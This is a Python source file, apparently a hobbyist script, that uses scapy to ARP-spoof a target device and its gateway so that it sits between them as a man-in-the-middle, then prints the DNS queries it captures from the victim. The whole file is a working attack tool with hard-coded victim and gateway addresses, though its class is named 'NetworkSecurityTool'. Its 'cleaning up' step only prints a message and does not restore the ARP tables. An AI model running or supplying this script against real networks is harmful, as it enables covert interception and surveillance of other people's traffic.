import scapy.all as scapy # The primary library used for processing network packets.
import time # To adjust packet transmission intervals
import sys # To safely exit the program or read the system arguments

class NetworkSecurityTool:
    def __init__(self, target_ip, gateway_ip):
        """Initializes the tool with target and gateway information."""
        self.target_ip = target_ip # IP address of the target device (victim)
        self.gateway_ip = gateway_ip # Modem (gateway) IP address

    def get_mac_address(self, ip):
        """Sends an ARP request to find the MAC address of a given IP."""
        arp_request_packet = scapy.ARP(pdst=ip) # A packet asking the target: 'What is your MAC address?'
        broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # Broadcasts the packet to the entire network.
        combined_packet = broadcast_packet / arp_request_packet # Merges the two layers
        # Sends the packet and receives the list of responders
        answered_list = scapy.srp(combined_packet, timeout=2, verbose=False)[0]
        
        if answered_list: # If a response has been received
            return answered_list[0][1].hwsrc # Returns the MAC address of the responding device.
        else:
            print(f"[-] Could not find MAC for {ip}. Check connection.")
            sys.exit() # Stops the program if the MAC address is not found.

    def spoof_arp(self, target_ip, spoof_ip):
        """Sends a fake ARP packet to link a MAC address with a different IP."""
        target_mac = self.get_mac_address(target_ip) # Learns the target's actual MAC address.
        # op=2 (Reply packet), psrc (Identifies the source as a modem), hwdst (Destination MAC address)
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False) # Ejects the fake packet from the network card.

    def process_dns_packet(self, packet):
        """Filters and displays DNS query names from captured packets."""
        if packet.haslayer(scapy.DNSQR): # If the packet contains a DNS query (site name)
            query_name = packet[scapy.DNSQR].qname.decode("utf-8") # Makes the site name readable.
            print(f"[+] DNS Query Detected: {query_name}") # Presses on the screen

    def start_attack(self):
        """Starts both ARP Spoofing and DNS Sniffing simultaneously."""
        print("[*] Security Tool started. Press CTRL+C to stop.")
        try:
            while True:
                # 1. The Victim Is the Modem: 'I Am the Modem'
                self.spoof_arp(self.target_ip, self.gateway_ip)
                # 2. Trick the modem: 'I am the victim'
                self.spoof_arp(self.gateway_ip, self.target_ip)
                
                # Network Sniffing: Capture and analyze just 1 packet, then continue the loop.
                # filter: Captures only DNS packets.
                scapy.sniff(filter="udp port 53", prn=self.process_dns_packet, count=1, store=0)
                
                time.sleep(2) # Wait 2 seconds to avoid overloading the modem.
        except KeyboardInterrupt:
            print("\n[!] Stopping and cleaning up...")

# --- MAIN EXECUTION ---
if __name__ == "__main__":
    # You can enter your own network details here.
    my_tool = NetworkSecurityTool(target_ip="192.168.0.86", gateway_ip="192.168.0.1")
    my_tool.start_attack()